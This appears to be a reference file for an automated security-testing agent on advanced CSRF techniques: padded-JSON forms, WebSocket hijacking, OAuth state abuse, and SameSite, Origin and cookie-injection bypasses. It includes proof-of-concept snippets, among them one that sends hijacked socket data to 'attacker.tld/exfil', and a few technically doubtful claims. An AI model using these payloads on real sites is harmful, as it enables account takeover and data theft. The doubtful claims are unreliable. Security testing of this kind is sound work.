---
name: csrf-advanced-deep
description: CSRF at advanced+expert depth — sub-resource CSRF, JSON-endpoint CSRF via content-type tricks, WebSocket CSRF hardened-target bypasses, CORS-relaxed exploits, OAuth/OIDC flow abuse, SameSite defense-depth, and composite-chain construction.
sibling: csrf
load_when: scan_mode == "deep"
---

# CSRF — Advanced Depth

This is the advanced+expert deep sibling to `csrf.md`. The base owns the class framing, SameSite basics (including the Lax+POST 2-minute window), CSWSH introduction, Fetch Metadata defense mechanics, double-submit bypass classes, PoC-template gallery, chaining routes, and the frontier-CVE routing map. The novel+frontier sibling `csrf_novel_deep.md` owns the 2024–2026 CVE dissections (Spring STOMP, ASP.NET Core smuggling→CSRF, OAuth RFC-9700 cluster, SSE-CSRF, Rails OTP-XOR) and current-frontier technique framing. This file owns the operational depth in between — sub-resource CSRF, JSON-endpoint attack depth, CSWSH against hardened targets, CORS-relaxed CSRF, OAuth flow abuse, SameSite defense-depth, preflight-avoidance depth, and composite-chain construction.

Load this file when the target has moved past a trivial PoC — the endpoints require nontrivial content types, or the CSRF defenses are partially deployed (Origin check but no token; token but weak binding; SameSite=Lax but not Strict; Fetch Metadata but only on some routes), or the chain requires composing CSRF with a cross-origin capability.

Every framework-specific behavior in this file is anchored to primary sources or measured. Every version-boundary claim referencing a specific CVE lives in the novel sibling per §2 CVE single-ownership; this file references by CVE number + route.

## Sub-Resource CSRF

CSRF traditionally involves top-level navigation or form submission. Sub-resource CSRF uses HTML tags that fetch resources cross-origin as delivery vectors — favicons, images, videos, audio, iframes, link-rel-preload, and similar. Any tag that fetches a URL with credentials attached is a candidate.

**Sub-resource tags with credential-forwarding behavior:**

- `<img src="URL">` — GET with cookies. Ignores response body; useful for state changes on GET-honoring endpoints.
- `<link rel="stylesheet" href="URL">` — GET with cookies. Same as `<img>` for state-change effect.
- `<link rel="prefetch" href="URL">` — GET with cookies (in browsers that honor prefetch); the browser may or may not send cookies depending on cross-origin prefetch policy (Chrome restricts credentials on cross-origin prefetch since Chrome 87).
- `<video src="URL">` / `<audio src="URL">` — GET with cookies.
- `<iframe src="URL">` — GET with cookies; the iframe loads the response, so it can be used for reading (if X-Frame-Options / CSP permits framing).
- `<link rel="preload" as="fetch" href="URL" crossorigin="use-credentials">` — sends credentials; the `crossorigin` attribute controls credential behavior explicitly.
- `<form action="URL" method="POST">` — POST with cookies; the canonical form-CSRF vector.

**Sub-resource delivery vector for state-change GET endpoints:**

Any GET endpoint that performs a state change is directly exploitable via `<img src>`:
```html
<img src="https://target/account/delete-newsletter-subscription">
```
The victim visits the attacker page; browser fetches the image URL; server-side executes the state change. No form submission, no visible UI interaction.

**Preload/prefetch race conditions:**

`<link rel="prefetch">` can fire before the user interacts with the page, before any script has a chance to be blocked, and often bypasses rate limits based on user-initiated request patterns.

**Font loading:**

`@font-face { src: url("URL"); }` in CSS also fetches with credentials. Less common but real.

**Fetch as CSRF variant with cross-origin restrictions:**

```html
<script>
fetch("https://target/state-change", {
  method: "POST", 
  credentials: "include",
  headers: {"Content-Type": "text/plain"},
  body: JSON.stringify({action: "delete-account"})
});
</script>
```

Fetch with `credentials: "include"` is a CSRF vector, but subject to CORS preflight for non-simple requests. Simple requests avoid preflight (see § Preflight Avoidance Matrix below).

## JSON-Endpoint CSRF Depth

Modern APIs are JSON-first, and JSON body content type typically triggers CORS preflight (killing simple CSRF). Advanced CSRF against JSON endpoints exploits parser-differential behaviors and content-type manipulation.

**Content-Type manipulation for JSON parsers:**

Many JSON parsers accept a JSON body even when the Content-Type doesn't match `application/json`. This bypasses the CORS preflight since `text/plain`, `application/x-www-form-urlencoded`, and `multipart/form-data` don't trigger preflight.

**Padded-JSON via text/plain form:**

```html
<form id=f action="https://target/api/action" method="POST" enctype="text/plain">
  <input name='{"action":"delete","victim":"user123","ignore":"' value='"}'>
</form>
<script>f.submit()</script>
<!-- Body serializes to: {"action":"delete","victim":"user123","ignore":"="} -->
<!-- Valid JSON; server parses; state change happens. -->
```

The trick: form-encoded bodies serialize each input as `name=value`. Craft one input whose name is `{"action":"delete","victim":"user123","ignore":"` and value is `"}`. The concatenation produces `{"action":"delete","victim":"user123","ignore":"="}` — the `=` between name and value is embedded in the JSON as a string value.

**Parser tolerance for extra characters:**

Some JSON parsers accept trailing garbage, comments, or non-JSON prefixes. If the parser accepts `{"action":"delete"}some-trailing`, a form-based CSRF that generates a body ending in `=trailing` may be accepted.

**Multipart with JSON payload:**

Some APIs accept JSON in a multipart-form field:
```html
<form id=f action="https://target/api/action" method="POST" enctype="multipart/form-data">
  <input name="json" value='{"action":"delete","victim":"user123"}'>
</form>
```
The server-side extracts `json` field, parses as JSON, executes. No preflight triggered.

**Framework parser exceptions:**

- **Django REST Framework** — JSONParser triggers preflight; but if the app registers `FormParser` as a fallback for `text/plain`, the CSRF is possible.
- **Express with body-parser** — `express.json()` requires `Content-Type: application/json` by default; the `type` option allows customization. Some deployments accept `text/plain` for JSON parsing (misconfigured).
- **Spring MVC** — `@RequestBody` binding respects Content-Type; but if the controller has multiple `@RequestMapping` methods with different `consumes`, a request without a matching Content-Type may fall through to a non-JSON handler.
- **ASP.NET Core** — model binders respect Content-Type; but the `[FromBody]` attribute may be flexible for JSON content-types with variations.

## CSWSH Against Hardened Targets

WebSocket CSRF (Cross-Site WebSocket Hijacking) is documented in the base for the classical Origin-unchecked case. Advanced surface: hardened targets that check Origin but have specific bypass patterns.

**Origin-check bypass patterns:**

- **Wildcard Origin allowlist** — target allows `*.example.com`; attacker uses XSS or subdomain takeover on any sibling to establish a page that opens the WebSocket.
- **Origin allowlist with substring match** — target checks `origin.endsWith(".example.com")` — attacker registers `evilexample.com` which passes.
- **Origin allowlist with regex misuse** — regex `^https://.+\.example\.com$` matches `https://evil.example.com` (subdomain of example.com — attacker-controlled) or `https://evilhttps://foo.example.com` in some parsers.
- **Null Origin handling** — a WebSocket handshake from a sandboxed iframe or a `data:` URI produces `Origin: null`; some targets accept `null` as trusted (misconfigured).

**Handshake-request smuggling:**

If the target's HTTP layer is smuggling-vulnerable (see `http_request_smuggling.md`), a smuggled WebSocket-handshake request can bypass Origin checks at the front-end while reaching the back-end.

**Subprotocol / extension abuse:**

`Sec-WebSocket-Protocol` and `Sec-WebSocket-Extensions` are handshake headers; a target that trusts specific subprotocols for authentication may be bypassed by attacker-supplied values.

**Read primitive from WebSocket:**

Unlike form CSRF, CSWSH lets the attacker *read* the WebSocket messages. This means CSWSH is used for:
- Message exfiltration (chat messages, notifications, real-time data pushed to the socket).
- Session-token exfiltration (if the server pushes a JWT or session identifier over the socket).
- API-key retrieval (some apps push API keys over WebSocket for real-time integrations).

**Detection depth:**

```javascript
// Attacker-page CSWSH test
const ws = new WebSocket("wss://target.example/socket");
ws.onopen = () => {
  console.log("CSWSH open success — Origin check missing or bypassed");
  ws.send(JSON.stringify({action: "list_api_keys"}));
};
ws.onmessage = e => {
  console.log("Received:", e.data);
  navigator.sendBeacon("https://attacker.tld/exfil", e.data);
};
ws.onerror = e => console.log("CSWSH rejected — check Origin allowlist");
```

## CORS-Relaxed CSRF (Upgrade to Read-Back)

**Canonical owner for CORS mechanism**: `cors_misconfiguration` and `cors_misconfiguration_advanced_deep` own the CORS misconfiguration class (origin reflection, allow-credentials rules, null-origin trust, allowlist-bypass depth, preflight expansion, Fetch-standard three-condition confirmation rule). This section is the CSRF-side residual — specifically, how CORS misconfiguration upgrades a CSRF primitive from action-only (CSRF) to action-plus-response-read (CORS-relaxed CSRF).

**CSRF-vs-CORS-misconfig impact framing:**

- **CSRF alone** — attacker-page performs action on target, cannot read response. State-change class.
- **CORS misconfig alone** — attacker-page reads response but may not perform state change (depends on method, preflight). Confidentiality-only class.
- **CORS-relaxed CSRF** — attacker-page performs action AND reads response. Combined state-change + confidentiality impact.

The impact tier is strongest when (a) the target emits reflected ACAO + ACAC:true, AND (b) the preflight-allowance (`Access-Control-Allow-Methods` includes the state-changing method; `Access-Control-Allow-Headers` includes any custom headers the state-change needs) also admits the request. Load `cors_misconfiguration.md § Confirmation and Validation Discipline` for the three-condition confirmation rule (echo + ACAC:true + authenticated endpoint); the CSRF-upgrade finding requires that gate plus the state-change invariant.

**Routing**: CORS mechanism depth lives at `cors_misconfiguration_advanced_deep.md § Null Origin Trust at Depth` + `§ Regex Escape and Pattern-Match Bypass Classes` + `§ Preflight Expansion and Allow-Headers Depth`. The CVE catalog for middleware-default CORS failures (Flask-CORS × 3, Fiber v2, Hono, elysia-cors) is at `cors_misconfiguration_novel_deep.md`. CSRF-side detection here uses the general CORS probe; verify the three-condition rule for the credentialed-read half.

## OAuth / OIDC Flow Abuse

OAuth 2.0 and OIDC flows are CSRF-vulnerable at multiple points. The classical `state` parameter defense is RFC-mandated but frequently misimplemented.

**OAuth CSRF class expressions:**

- **Missing `state` parameter** — no CSRF protection on the authorize flow; attacker can force the victim to authorize an attacker-controlled OAuth client.
- **Static `state`** — attacker knows or can predict the `state` value; forges a valid-looking request.
- **`state` not tied to session** — a valid `state` minted by any user is accepted for any other user's flow.
- **`state` reused** — after a successful auth, the same `state` is accepted for a subsequent replay attempt.
- **Empty-string `state` accepted** — server treats empty `state` as valid.

**Attack expressions:**

- **Login CSRF via OAuth** — force victim to authorize an attacker-controlled provider account; victim's app account is linked to attacker's provider identity; attacker now has persistent access.
- **Account-linking CSRF** — force victim to link an attacker-controlled provider account to their existing app account; attacker can then log in to the victim's account using the attacker's provider identity.
- **Consent-screen bypass** — some flows show a consent screen; a CSRF that skips consent has stronger impact.
- **`redirect_uri` manipulation** — combined with CSRF, force the authorization code to be returned to an attacker-controlled URI; captures the code, exchanges for tokens.

**RFC 9700 (Jan 2025):**

Upgraded `state` and PKCE from SHOULD to MUST for OAuth 2.0 clients. Any client not implementing both after RFC 9700 is out of spec. Verify per client.

**OIDC-specific expressions:**

- **`nonce` parameter** — OIDC requires `nonce` for replay protection; some implementations miss it.
- **`id_token` handling** — a CSRF that forges an `id_token` response can bypass client-side identity checks.
- **Logout CSRF** — force victim to log out at the identity provider; useful precursor to a login CSRF.

## Preflight Avoidance Matrix

CORS preflight is triggered by non-simple requests. A CSRF that avoids preflight can hit any endpoint without CORS interfering.

**Simple request criteria (avoid preflight):**

1. Method: GET, HEAD, POST only.
2. Headers: only CORS-safelisted headers (`Accept`, `Accept-Language`, `Content-Language`, `Content-Type`, `Range`, and a few others — see MDN CORS spec).
3. Content-Type (if POST): only `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`.

**Preflight-triggering conditions:**

- Custom headers (`X-Custom`, `Authorization` explicitly set, `X-Requested-With`, etc.).
- Content-Type not in the safelist (e.g., `application/json`).
- Any request with `credentials: "include"` where the server response requires `Access-Control-Allow-Credentials: true` — but preflight is only for non-simple requests.

**Preflight-avoiding CSRF vectors:**

| Delivery vector | Preflight? | Notes |
|---|---|---|
| `<form>` submit | never | The canonical CSRF vector; no preflight regardless of method or Content-Type (form uses safelisted content types). |
| `<img>`, `<link>`, `<script>` | never | GET-only. |
| `fetch()` with simple method + safelisted Content-Type | never | Text/plain fetches for JSON-parsing endpoints. |
| `fetch()` with `application/json` | yes | Preflight triggers OPTIONS; server must respond. |
| `fetch()` with custom header | yes | Preflight triggers. |
| `<iframe src>` | never | GET. |
| `XMLHttpRequest` with `withCredentials=true` and non-simple | yes | Same as fetch. |
| WebSocket handshake | never | CORS doesn't apply to WebSocket. |
| SSE (EventSource) | never | Simple request; auto-reconnect replays credentials. |

**Content-Type matrix for JSON endpoints:**

To CSRF a JSON endpoint without preflight:
- Use `text/plain` if the parser accepts JSON in text/plain body.
- Use `multipart/form-data` with a `json` field if the parser extracts and parses.
- Use `application/x-www-form-urlencoded` if the parser accepts form fields as JSON keys (`data[key]=value`).

## SameSite Defense-Depth Expansion

The base introduces SameSite classes; advanced surface adds specific behaviors and edge cases.

**Cookie-refresh timing for Lax+POST window:**

The Chrome Lax+POST 2-minute window applies specifically to cookies without an explicit `SameSite` attribute (defaulted-Lax). If the target refreshes its session cookie on a common action (login, page load, SSO landing), the window is fresh:

1. Attacker triggers victim's session cookie refresh via forced login (login CSRF) or SSO redirect.
2. Within 2 minutes, attacker-page auto-submits a top-level POST CSRF; the fresh defaulted-Lax cookie is sent cross-site.

**Same-site sibling pivots depth:**

SameSite is same-*site*, not same-*origin*. The eTLD+1 (public-suffix + 1 level) defines the boundary:
- `example.com` and `sub.example.com` are same-site.
- `example.co.uk` and `sub.example.co.uk` are same-site (co.uk is the public suffix).
- `example.com` and `attacker.com` are cross-site.

**Chained attacks via sibling foothold:**

- **XSS on `sub.example.com` → cookie setting on `.example.com`** — the XSS sets a `Domain=.example.com` cookie; the parent domain receives it. Combined with double-submit-cookie CSRF, the attacker controls both halves.
- **Subdomain takeover on `blog.example.com` → same-site trust** — attacker controls the takeover subdomain; can make cross-origin requests to `example.com` that Chrome treats as same-site.

**Method-override chains:**

- If the app honors `_method=DELETE` in a form body or `X-HTTP-Method-Override: DELETE` header, a POST from a cross-site page can be interpreted as a DELETE at the app layer.
- Method-override + SameSite-Lax bypass: the request travels as a POST (SameSite-Lax honors defaulted cookies within window); the app interprets as a state-change DELETE.

**Legacy-browser SameSite bypass:**

- Old browsers (Firefox pre-96, Safari pre-15) ignored SameSite for various shapes.
- Non-browser clients (curl, server-side fetchers, mobile apps with cookie jars) ignore SameSite entirely.
- Any target whose defense relies solely on SameSite fails against these clients; combined with a chain that involves a non-browser client, the class fires.

## Confirmation Discipline Deep

Basic CSRF confirmation is documented in the base. Advanced surface:

**Multi-browser confirmation matrix:**

A CSRF finding should reproduce across:
- Latest Chrome, Firefox, Safari, Edge.
- Latest mobile Chrome, mobile Safari.
- Any embedded WebView (mobile app in-app browser).

**Test in incognito for cookie-isolation:**

Reproduce the CSRF in an incognito browser where the tester is logged in as the victim. This isolates the finding from stale cookie state.

**Distinguish CSRF from XSS-triggered actions:**

If the attacker page uses inline JS or executes attacker-supplied code via XSS-adjacent means, the finding is XSS + action, not pure CSRF. Pure CSRF uses only cross-origin HTTP semantics without JS execution.

**PoC-hosting requirements:**

- The PoC must be hosted on a genuinely-cross-origin domain (not a target subdomain).
- The PoC must not rely on prior authentication on the attacker origin.
- The PoC should require only one victim action: visiting the URL.

**Reproduction rate:**

Reproduce the CSRF at least 3 times to rule out state-dependent transient behavior. If reproduction requires specific timing (Lax+POST window), verify the window bounds.

## Method-Override and Verb-Tunneling Depth

Many frameworks support method override — using a POST or GET request to trigger DELETE, PUT, PATCH behavior. This is CSRF-adjacent because SameSite=Lax permits GET; method-override lets a Lax cookie deliver DELETE.

**Method-override mechanisms:**

- **`_method` body parameter** — Rails, Symfony, Laravel, Slim; a POST with `_method=DELETE` in the body executes as DELETE.
- **`X-HTTP-Method-Override` header** — Rails, older ASP.NET, some Spring configurations.
- **`X-Method-Override` header** — variant naming.
- **`X-HTTP-Method` header** — used by Microsoft-produced frameworks.
- **Query parameter** — `?_method=DELETE` — some frameworks.

**Attack via method-override + SameSite-Lax bypass:**

- Target uses `SameSite=Lax`; SameSite=Lax permits top-level cross-site GET.
- Attacker crafts `<img src="https://target/api/users/123?_method=DELETE">`.
- Browser sends GET with SameSite-Lax cookie; server interprets as DELETE due to method override.
- State change succeeds despite SameSite protection.

**Detection:**

Test every state-change endpoint for method-override behavior:
- Send POST with `_method=DELETE` body param; observe if DELETE fires.
- Send POST with `X-HTTP-Method-Override: DELETE` header; observe.
- Send GET with `?_method=DELETE` query; observe.

**Framework defenses:**

- Rails 5+ disables `_method` from GET; only POST accepts it.
- Modern ASP.NET Core doesn't accept `X-HTTP-Method-Override` by default (opt-in).
- Spring's `HiddenHttpMethodFilter` handles `_method` — POST-only.

Each framework's exact behavior needs verification.

## Referer/Origin Validation Weaknesses

Origin/Referer headers are often the sole CSRF defense on JSON APIs. Weaknesses:

**Substring-match Origin allowlist:**

```java
if (origin.contains("example.com")) { ... }
```
Bypass: `https://evil.example.com.attacker.tld` contains `example.com`. Substring match is broken; the fix is exact match or eTLD+1 match.

**Regex allowlist without anchors:**

```regex
https://.+\.example\.com
```
Bypass: `https://evil.example.com.attacker.tld` matches. Anchor with `$`.

**null Origin acceptance:**

```java
if (origin == null || origin.equals("null") || origin.equals(allowed)) { ... }
```
Bypass: sandboxed iframe or `data:` URI produces `Origin: null` which the check accepts.

**Referer stripping via meta refresh:**

Legitimate Referer is stripped in some navigation scenarios (meta refresh, `rel="noreferrer"`, HTTPS-to-HTTP downgrade). A defense that fails-open on missing Referer is bypassable.

**HTTP-2 downgrade for Referer:**

HTTP/2 to HTTP/1 downgrade may drop Referer in some proxy configurations.

**Testing:**

For each state-change endpoint, test:
- Send with an attacker-controlled Origin like `https://evil.example.com`.
- Send with `Origin: null`.
- Send with no Origin at all.
- Send with a subdomain that legitimately belongs to attacker (via subdomain takeover).

## SPA-Specific CSRF

Modern single-page applications (React, Vue, Angular, Svelte) mix cookie-based session management with client-side state. CSRF surface varies based on the specific architecture.

**Pure-bearer-token SPA:**

- Session managed via `Authorization: Bearer <JWT>` header, stored in localStorage or sessionStorage.
- No cookies for session; no CSRF surface from cross-origin requests.
- But: XSS still reads localStorage → session theft → not-CSRF impact.

**Cookie-based SPA:**

- Session cookie set by server; SPA calls APIs with `credentials: "include"`.
- Full CSRF surface applies.
- Modern SPAs often use `SameSite=Strict` cookies, closing much of the surface — but not all (Lax+POST window still applies to defaulted cookies).

**Hybrid SPA (cookie + bearer token):**

- Session cookie for authentication; bearer token for API authorization.
- If the token is in localStorage, CSRF cannot forge the token — but CSRF against endpoints that rely on the cookie alone succeeds.
- Identify which endpoints check cookie vs token; endpoints checking cookie only are the CSRF surface.

**SPA CSRF token distribution:**

- SPAs often fetch a CSRF token via API on page load, then include it in every state-change request header.
- If the token-fetching endpoint is CORS-allowed to arbitrary origins (misconfig), attacker page fetches the token, then uses it in a CSRF-with-token request.
- If the token is in a `Set-Cookie: XSRF-TOKEN=<value>; SameSite=Lax`, attacker cannot read the cookie (HTTP-only or JS restrictions), but the token still travels with the request — double-submit-cookie pattern.

**Framework-specific SPA CSRF handling:**

- **Angular** — `@angular/common/http`'s `HttpClientXsrfModule` sets a default XSRF cookie/header pattern; misconfiguration in the module setup breaks it.
- **React** — no built-in CSRF handling; developers wire it manually. Common mistakes: not checking the CSRF header on state-change requests.
- **Vue** — Axios interceptor pattern for CSRF token; failures at the interceptor level break the defense.
- **Next.js / Nuxt / SvelteKit** — server-side rendering complicates the picture; CSRF protection often lives at the API layer, but SSR-rendered forms may not include tokens.

**Detection depth for SPA CSRF:**

1. Determine session mechanism: cookie, bearer, hybrid.
2. If cookie-based, test cross-origin state-change requests.
3. If bearer-based, test whether cookies are ever accepted as authentication fallback.
4. Fingerprint the framework and its CSRF pattern.

## Mobile / WebView CSRF

Mobile apps often embed a WebView for third-party integrations (payment, OAuth, marketing). CSRF surface in mobile:

**In-app WebView:**

- WebView shares the app's cookie jar with the containing app in some configurations.
- A CSRF PoC loaded in an in-app WebView executes with the app's session cookies.
- Deep links (`myapp://action?param=value`) may trigger state changes without CSRF protection (if the app treats deep-link params as authoritative).

**Mobile Safari / Chrome:**

- Same-site policies apply; cookies inherited from the browser's cookie jar.
- Fingerprinting is harder; mobile browsers have different UA strings and different feature support.

**Cross-app CSRF via URL scheme:**

- App A registers URL scheme `apA://`; App B (attacker) launches `apA://sensitive-action?param=malicious`.
- App A processes the URL without CSRF protection (URL scheme access is treated as user-triggered).
- Mobile OSes have partial protection (Android's `PackageManager` verification, iOS's Universal Links) but not universal.

**Confirmation methodology:**

- Test on physical device or accurate emulator.
- Verify the WebView cookie inheritance behavior.
- Test URL-scheme handoff between apps.

## Cache-Based CSRF via Reflected Content

If a target reflects request content into a cached response, an attacker can indirectly perform CSRF through cache poisoning.

**Class shape:**

1. Attacker sends a request that pollutes a cached response with content that references a state-change URL.
2. Victim requests the cached response; the browser fetches the referenced URL as a sub-resource with credentials.
3. Sub-resource CSRF fires via the poisoned cache.

**Concrete example:**

- Cacheable endpoint: `/site/config.js` reflects a query parameter (`?callback=name`) into the response.
- Attacker requests `/site/config.js?callback=</script><img src="/account/delete-newsletter">`.
- Response is cached with the malicious content.
- Every subsequent user fetching `/site/config.js` triggers the browser to load `/account/delete-newsletter` as an image, with credentials.

**Detection:**

- Identify cacheable endpoints that reflect request content.
- Craft payloads that reference state-change URLs.
- Verify cache poisoning via a different client.

## GraphQL CSRF Depth

GraphQL introduces specific CSRF considerations distinct from REST.

**GET-based queries:**

- GraphQL over GET (`?query={...}&variables={...}`) is common for read queries.
- If mutations are allowed via GET (misconfiguration), state changes are top-level-GET-CSRFable.
- Test: send a mutation as a GET request; observe whether it executes.

**Persisted queries:**

- Some GraphQL servers accept only pre-registered query IDs (e.g., Facebook's persisted queries).
- If the ID space is guessable or brute-forceable, attacker can invoke any pre-registered mutation.

**Batched operations:**

- GraphQL batching allows multiple operations in one request (`[{query: "..."}, {query: "..."}]`).
- Batches may mix queries and mutations; a batch that appears innocuous may hide a mutation.

**Content-Type manipulation:**

- GraphQL typically uses `application/json`; but some servers accept `application/graphql` or even `text/plain` with a query body.
- Content-Type manipulation for preflight avoidance applies as with any JSON endpoint.

**CSRF defenses in GraphQL:**

- Apollo Server: default CSRF prevention requires a preflight for non-GET operations (added in v3+). Disable at your own risk.
- GraphQL Yoga: similar built-in CSRF prevention.
- Custom GraphQL servers: often lack CSRF middleware by default.

**Detection:**

- Identify the GraphQL endpoint (`/graphql`, `/api/graphql`).
- Test mutation delivery via GET (top-level-nav CSRF via `<img src>`).
- Test batched mutation delivery.
- Test content-type variants.

## Composite Chain — Login CSRF → OAuth Linking → Account Takeover

Worked example:

1. Target: web app with cookie-based sessions; OAuth linking supported for identity providers.
2. Attacker registers an OAuth account with a provider (Google, GitHub) using an attacker-controlled email.
3. Attacker crafts login CSRF PoC: cross-origin form POST to `/login` with attacker's credentials.
4. Victim visits attacker page; browser submits the form; victim is now logged in as the attacker.
5. Victim doesn't notice (attacker chose a plausible-looking account or the UI doesn't clearly show the account switch).
6. Victim performs OAuth linking on the attacker's account, linking their real identity provider.
7. Attacker now can log in via OAuth using their own credentials, but the linked identity gives attacker access to victim's real provider identity for identity-verification purposes.
8. Alternative: attacker-controlled account has an OAuth link that redirects to attacker-owned provider; when victim performs actions, they leak data to attacker.

## Composite Chain — CSWSH + Session-Token Push → API Access

Worked example:

1. Target: real-time app with WebSocket-based session management. Server pushes JWT tokens over WebSocket for API integration.
2. Attacker crafts CSWSH PoC: attacker page opens `wss://target/socket` from victim's browser.
3. Origin check missing on WebSocket handshake — socket opens.
4. Attacker sends `{"action": "get_api_key"}` over the socket.
5. Server responds with the JWT/API key over the socket.
6. Attacker's onmessage handler exfiltrates the token.
7. Attacker now has victim's API access; can call any API the token authorizes.

## Composite Chain — Sibling XSS + Cookie Injection → Double-Submit Bypass

Worked example:

1. Target: web app at `example.com` with double-submit-cookie CSRF defense (token in cookie + mirrored in POST body).
2. Attacker finds XSS on `blog.example.com` (sibling subdomain).
3. Attacker's XSS payload sets a `Domain=.example.com` cookie with an attacker-chosen CSRF token value.
4. Attacker-hosted page (on `attacker.tld`) auto-submits a POST to `example.com/api/action` with the same attacker-chosen token in the body.
5. Cookie precedence: injected cookie with `Domain=.example.com` wins over any legitimate cookie at `example.com`.
6. Double-submit check passes (both halves attacker-controlled).
7. State change succeeds.

## Composite Chain — SSE-CSRF Read + State-Change POST

Worked example:

1. Target: SSE endpoint at `/api/updates` returning user-specific data with `Access-Control-Allow-Origin: *`.
2. Attacker page opens `new EventSource("https://target/api/updates")` — CORS simple request, no preflight, cookies attached.
3. Attacker reads user-specific data from the SSE stream.
4. Extracted data includes CSRF token, user ID, permissions map.
5. Attacker constructs a targeted CSRF POST using the extracted CSRF token.
6. POST succeeds because the extracted token is valid.
7. Chain: SSE-CSRF read → token exfil → CSRF-with-token → state change.

## HTTP-Header Injection Chains for CSRF

If the target has HTTP-header injection (CRLF injection into response headers), an attacker can inject `Set-Cookie` headers to plant CSRF tokens or bypass double-submit-cookie defenses. The chain converts an injection primitive into a CSRF exploitation vector.

**Primary chain — cookie injection via CRLF:**

1. Header-injection vulnerability at `/redirect?url=`.
2. Attacker crafts URL that produces a response including `Set-Cookie: csrf_token=attacker_value; Path=/; Domain=.example.com`.
3. Victim visits attacker page; is redirected to the header-injection URL; receives the Set-Cookie; cookie is now planted with an attacker-chosen value.
4. Attacker-hosted page then performs CSRF using the planted cookie value in the request body (double-submit).
5. Server compares the (attacker-planted) cookie value with the (attacker-supplied) body value; they match; CSRF succeeds.

**Route to `header_injection.md` for the CRLF-injection primitive.**

**Chain variants:**

- **Session-cookie override** — inject `Set-Cookie: session=<attacker-session>` to log the victim into the attacker's session (login CSRF variant via cookie injection).
- **CSRF-domain override** — inject `Set-Cookie: XSRF-TOKEN=<attacker-value>; Domain=.example.com` — the parent-domain scope makes it override the legitimate CSRF cookie on all subdomains.
- **Path-scoped cookie override** — inject `Set-Cookie: session=<attacker-session>; Path=/admin` — makes the attacker session apply only to admin paths, potentially confusing the app's session logic.
- **Attribute-flipping via injection** — inject cookies without `Secure` or `HttpOnly` flags where the app's legitimate cookies have them; downgrade the security posture.

**Header-injection prerequisites:**

- CRLF injection into response headers via a reflected parameter (URL parameter reflected into `Location`, `Set-Cookie`, or custom response header).
- Or open-redirect with header manipulation.
- Or cache-key injection where the cache stores the poisoned Set-Cookie response.

**Compensating controls:**

- Framework-level rejection of CRLF bytes in response-header values (modern web servers do this by default; verify).
- Signing CSRF tokens with a session-derived key that the attacker cannot forge.
- Cookie prefix restrictions (`__Host-` prefix requires `Secure` and same-origin; makes cookie injection harder).

**Detection:**

- Test every reflected parameter for CRLF injection into response headers.
- Verify Set-Cookie manipulation is possible.
- Chain to a target CSRF endpoint that uses double-submit-cookie.

**Historical instances:**

- Multiple bug-bounty submissions have used header-injection + CSRF chain against major web apps (documented at h1/bugcrowd disclosure feeds).
- Framework CVEs in header-parsing code paths regularly reintroduce this primitive.

## First-Party CSRF (Same-Site Tab-Vector)

Some CSRF surface exists within same-site trust: a tab on `sub.example.com` (attacker XSS-controlled) can perform CSRF against `example.com` because they're same-site. This is not classical cross-site CSRF but shares the class shape.

**Attack primitive:**

- Attacker XSS on `blog.example.com`.
- XSS code performs `fetch("https://api.example.com/action", {method: "POST", credentials: "include", body: "..."})`.
- SameSite=Lax and even SameSite=Strict allow the request (both are same-site).
- Only per-endpoint CSRF token or Origin check prevents the action.

The impact class is smaller than cross-site CSRF but still real when the target's defense relies on SameSite alone.

**Sibling XSS as CSRF vector — enumeration:**

Any sibling subdomain XSS becomes a CSRF vector against the parent domain. Enumerate:
1. Every `*.example.com` subdomain.
2. Every subdomain with any user-controllable output.
3. Every subdomain-takeover-vulnerable target (route to `subdomain_takeover.md`).

For each, verify whether an XSS or takeover on that sibling can execute state-change requests against the parent.

**Same-site cross-scheme:**

HTTPS `example.com` and HTTP `example.com` are technically same-site but different origins. Cookies scoped without `Secure` are sent to both; a downgrade attacker (MITM on HTTP) can inject requests that appear same-site.

**Same-site tab-vector detection:**

- Test whether the target's CSRF defense relies solely on SameSite (no Origin check, no token verification).
- If yes, any sibling XSS becomes a CSRF vector.
- If Origin check is present, verify the allowlist scope — a permissive allowlist (`.*\.example\.com`) may accept the sibling as trusted.

**Compensating controls:**

- Enforce Origin check on state-change endpoints even with SameSite.
- Anti-CSRF tokens bound to the specific endpoint and method.
- CSP `default-src 'self'` restricts what the sibling XSS can do to the parent origin.
- Cookie scoping — session cookies scoped to specific hostnames rather than the parent domain.

**Related class — same-site fetch from cross-origin iframe:**

A cross-origin iframe embedded in a same-site parent may perform fetches that inherit the parent's cookies in some browsers. Historically Chrome's SameSite behavior for iframe fetches has evolved; verify current behavior per browser.

**Historical instances:**

- Same-site tab-vector CSRF has been the mechanism behind multiple bounty submissions to major web apps (Facebook, Google, GitHub) where the primary XSS on a sibling was leveraged for parent-domain CSRF.

## Preflight-Bypass via Content-Type Ambiguity

Some request-body parsers accept content that's ambiguously typed. When the actual Content-Type header suggests one parser but the body content is JSON (or vice versa), the parser may choose based on body-sniff:

- Server parses body as JSON when the body starts with `{`, regardless of Content-Type.
- Attacker sends `Content-Type: text/plain` (no preflight) with JSON body.
- Server body-sniffs, parses as JSON, executes state change.

**Testing:**

For each JSON endpoint, test:
- Send with `Content-Type: text/plain` and JSON body.
- Send with `Content-Type: multipart/form-data` and JSON body.
- Send with `Content-Type: image/png` and JSON body.
- Observe which content-types the server accepts JSON from.

## Advanced Tooling

Beyond the base's tooling, advanced CSRF assessment benefits from specialized tools categorized by attack surface:

**CSWSH tooling:**

- **CSWSH-PoC-generator** (community) — automated CSWSH exploitation given a target endpoint. Generates the WebSocket connect + message exchange PoC for a target's socket protocol.
- **`WebSocket-Fuzzer`** — Burp extension for CSWSH testing; combines Origin-check bypass patterns with subprotocol/extension abuse.
- **Custom `wss://` clients** — for testing WebSocket handshake with attacker Origin and subprotocol variants.

**CORS misconfig scanners:**

- **`cors-scanner`** (`github.com/chenjj/CORScanner`) — automated CORS misconfig detection. Tests substring, regex, null, and wildcard bypasses.
- **`corsy`** — Python-based CORS scanner; similar coverage.
- **Burp Suite Pro's Active Scanner** — includes CORS misconfig detection.

**OAuth flow testing:**

- **`OAuth-Toolkit`** — for OAuth flow-abuse testing including state-parameter verification. Tests missing/static/reused state, replay attacks, redirect_uri manipulation.
- **`oauth-analysis`** — passive analysis of an app's OAuth flow.
- **Manual OAuth debug UAs** — for reproducing specific OAuth callback flows in a controlled environment.

**CSRF-specific delivery vectors:**

- **`ffuf` with header injection** — for testing Fetch Metadata / Origin variations at scale across a target's endpoints.
- **`nuclei` CSRF templates** — automated CSRF detection templates; community-maintained.
